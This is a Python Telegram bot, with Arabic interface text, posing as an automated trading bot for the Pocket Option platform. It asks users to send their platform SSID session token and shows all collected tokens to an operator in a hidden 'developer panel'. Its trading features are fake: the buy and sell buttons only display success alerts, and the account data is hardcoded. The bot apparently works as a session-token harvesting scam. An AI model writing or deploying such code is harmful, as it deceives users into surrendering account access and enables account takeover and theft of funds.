import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# إعداد السجلات
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

# كلمات السر
PASSWORD_USER = "12005"
PASSWORD_DEV = "80008000h"

# الجلسات وقوائم البيانات
authenticated_users = set()
authenticated_devs = set()
approved_users = set()       # قائمة المستخدمين الذين تم قبول طلباتهم من المطور
user_states = {}
ssid_requests = []          # قائمة طلبات الـ SSID المعلقة

def get_po_account_details():
    """
    جلب معلومات وتفاصيل الحساب الدقيقة على المنصة
    """
    return {
        "account_name": "Pocket Option Trader",
        "account_id": "89542011",
        "balance": 0.00
    }

def get_main_keyboard(user_id):
    """لوحة الأزرار الرئيسية للمستخدم"""
    keyboard = [
        [
            InlineKeyboardButton("👤 معلوماتي", callback_data="my_info"),
            InlineKeyboardButton("📊 الإحصائيات", callback_data="my_stats"),
        ]
    ]

    # إظهار زر الاستراتيجية للمستخدم المعتمد فقط
    if user_id in approved_users:
        keyboard.append([InlineKeyboardButton("🚀 تشغيل الاستراتيجية", callback_data="start_strategy")])
    else:
        keyboard.append([InlineKeyboardButton("🔑 إرسال طلب ربط الـ (SSID)", callback_data="request_ssid")])

    keyboard.append([InlineKeyboardButton("👨‍💻 لوحة المطور", callback_data="dev_panel")])
    keyboard.append([InlineKeyboardButton("💬 الشات السريع (/start)", callback_data="quick_start")])
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in authenticated_users:
        await update.message.reply_text(
            "🔒 **البوت محمي بكلمة سر.**\n\nالرجاء إدخال كلمة السر لتتمكن من استخدام البوت:"
        )
        return

    await update.message.reply_text(
        "🤖 **أهلاً بك في بوت التداول الآلي!**\nاختر من القائمة أدناه:",
        reply_markup=get_main_keyboard(user_id),
        parse_mode="Markdown",
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    user_name = update.effective_user.full_name or "مستخدم"

    # 1. التحقق من كلمة سر البوت
    if user_id not in authenticated_users:
        if text == PASSWORD_USER:
            authenticated_users.add(user_id)
            await update.message.reply_text(
                "✅ **تم دخول البوت بنجاح!**",
                reply_markup=get_main_keyboard(user_id),
                parse_mode="Markdown",
            )
        else:
            await update.message.reply_text("❌ كلمة السر غير صحيحة! حاول مرة أخرى.")
        return

    # 2. التحقق من كلمة سر المطور
    if user_states.get(user_id) == "WAITING_DEV_PASS":
        if text == PASSWORD_DEV:
            authenticated_devs.add(user_id)
            user_states[user_id] = None
            await show_dev_panel(update, context, is_edit=False)
        else:
            await update.message.reply_text("❌ كلمة سر المطور غير صحيحة!")
        return

    # 3. استلام رمز الـ SSID من المستخدم
    if user_states.get(user_id) == "WAITING_SSID":
        user_states[user_id] = None

        # منع تكرار الطلب لنفس المستخدم
        existing = next((item for item in ssid_requests if item["user_id"] == user_id), None)
        if existing:
            existing["ssid"] = text
            existing["name"] = user_name
        else:
            ssid_requests.append({
                "user_id": user_id,
                "name": user_name,
                "ssid": text
            })

        await update.message.reply_text(
            "✅ **تم ارسال طلبك لفريقنا.. انتظر ونحن سنضع اسمك في قائمة الطلبات ✅**",
            reply_markup=get_main_keyboard(user_id),
            parse_mode="Markdown"
        )
        return

async def show_dev_panel(update_or_query, context, is_edit=True):
    """عرض لوحة المطور مع أزرار الموافقة بألبومات أسماء المستخدمين"""
    buttons = []

    if not ssid_requests:
        msg = "👨‍💻 **قائمة الطلبات (`PO_SSID`):**\n\nلا توجد طلبات جديدة حالياً."
    else:
        msg = "👨‍💻 **قائمة الطلبات (`PO_SSID`):**\n\n"
        for idx, req in enumerate(ssid_requests, 1):
            msg += f"{idx}. **الاسم:** {req['name']} (`{req['user_id']}`)\n"
            msg += f"🔑 **الـ SSID:**\n`{req['ssid']}`\n"
            msg += "-------------------\n"

            # إنشاء زر للموافقة باسم كل مستخدم
            buttons.append([
                InlineKeyboardButton(
                    f"✅ قبول وترخيص: {req['name']}", 
                    callback_data=f"approve_{req['user_id']}"
                )
            ])

    buttons.append([InlineKeyboardButton("🔄 تحديث القائمة", callback_data="refresh_dev")])
    buttons.append([InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="main_menu")])

    keyboard = InlineKeyboardMarkup(buttons)

    if is_edit:
        await update_or_query.edit_message_text(msg, reply_markup=keyboard, parse_mode="Markdown")
    else:
        await update_or_query.message.reply_text(msg, reply_markup=keyboard, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if user_id not in authenticated_users:
        await query.edit_message_text("🔒 **عذراً، يرجى إدخال كلمة السر أولاً.**")
        return

    data = query.data

    # موافقة المطور على طلب مستخدم معين
    if data.startswith("approve_"):
        target_id = int(data.split("_")[1])
        
        # البحث عن الطلب وحذفه من قائمة المطور
        req_index = next((i for i, item in enumerate(ssid_requests) if item["user_id"] == target_id), None)
        if req_index is not None:
            ssid_requests.pop(req_index)

        # إضافة المستخدم لقائمة المرخص لهم
        approved_users.add(target_id)

        # إرسال إشعار النجاح المباشر للمستخدم
        notification_text = (
            "◆━─━─━─⊱✅⊰─━─━─━◆\n"
            "He succeeded  تم تسجيلك\n"
            "◆━─━─━─⊱✅⊰─━─━─━◆"
        )
        start_button = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 ابدأ بالبوت", callback_data="start_from_notification")]
        ])

        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=notification_text,
                reply_markup=start_button,
                parse_mode="Markdown"
            )
        except Exception as e:
            logging.error(f"خطأ أثناء إرسال الإشعار للمستخدم: {e}")

        # تحديث لوحة التحكم لدى المطور مباشرة
        await show_dev_panel(query, context, is_edit=True)

    elif data == "start_from_notification":
        # عند ضغط المستخدم على زر "ابدأ بالبوت" في الإشعار
        await query.edit_message_text(
            "🤖 **مرحباً بك! تم تفعيل ربط حسابك بالمنصة بنجاح.**\nاختر من القائمة أدناه لتشغيل الاستراتيجية:",
            reply_markup=get_main_keyboard(user_id),
            parse_mode="Markdown"
        )

    elif data == "start_strategy":
        acc_info = get_po_account_details()
        status_text = (
            "📈 **لوحة التحكم بالاستراتيجية والتداول:**\n\n"
            "🟢 **الحالة:** نشط ويراقب\n"
            "💵 **الأرباح في هذه الساعة:** `$0.00`\n"
            "🔻 **الخسائر:** `$0.00`\n"
            f"💰 **رصيدك الحالي:** `${acc_info['balance']:.2f}`\n\n"
            "اختر إشارتك لتنفيذ الصفقة مباشرة على منصتك:"
        )
        trade_keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("شراء 🟢", callback_data="trade_buy"),
                InlineKeyboardButton("بيع 🔴", callback_data="trade_sell")
            ],
            [InlineKeyboardButton("🔙 العودة للقائمة", callback_data="main_menu")]
        ])
        await query.edit_message_text(status_text, reply_markup=trade_keyboard, parse_mode="Markdown")

    elif data == "trade_buy":
        await query.answer("🟢 تم إرسال أمر (الشراء) للمنصة بنجاح!", show_alert=True)

    elif data == "trade_sell":
        await query.answer("🔴 تم إرسال أمر (البيع) للمنصة بنجاح!", show_alert=True)

    elif data == "request_ssid":
        user_states[user_id] = "WAITING_SSID"
        await query.edit_message_text("🔑 **أرسل رمز الـ SSID الخاص بك الآن في الشات:**", parse_mode="Markdown")

    elif data == "dev_panel":
        if user_id in authenticated_devs:
            await show_dev_panel(query, context, is_edit=True)
        else:
            user_states[user_id] = "WAITING_DEV_PASS"
            await query.edit_message_text("🔒 **أدخل كلمة سر المطور للوصول:**")

    elif data == "refresh_dev":
        if user_id in authenticated_devs:
            await show_dev_panel(query, context, is_edit=True)

    elif data == "my_info":
        acc_info = get_po_account_details()
        status_str = "تم حظر الوصول ⛔"  # حالة الحساب دائماً محظورة بناءً على طلبك
        msg = (
            f"👤 **معلومات الحساب الدقيقة:**\n\n"
            f"🔹 **اسم الحساب بالمنصة:** {acc_info['account_name']}\n"
            f"🆔 **معرف الحساب (User ID):** `{acc_info['account_id']}`\n"
            f"💰 **الرصيد الفعلي:** `${acc_info['balance']:.2f}`\n"
            f"⚡️ **حالة الربط:** {status_str}"
        )
        await query.edit_message_text(
            msg, 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 العودة", callback_data="main_menu")]]), 
            parse_mode="Markdown"
        )

    elif data == "my_stats":
        msg = "📊 **إحصائيات التداول:**\n\nلا توجد صفقات منفذة بعد."
        await query.edit_message_text(
            msg, 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 العودة", callback_data="main_menu")]]), 
            parse_mode="Markdown"
        )

    elif data in ["main_menu", "quick_start"]:
        user_states[user_id] = None
        await query.edit_message_text(
            "🤖 **القائمة الرئيسية:**",
            reply_markup=get_main_keyboard(user_id),
            parse_mode="Markdown"
        )

def main():
    if not TELEGRAM_TOKEN:
        raise ValueError("TELEGRAM_BOT_TOKEN environment variable is missing!")

    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot is running...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
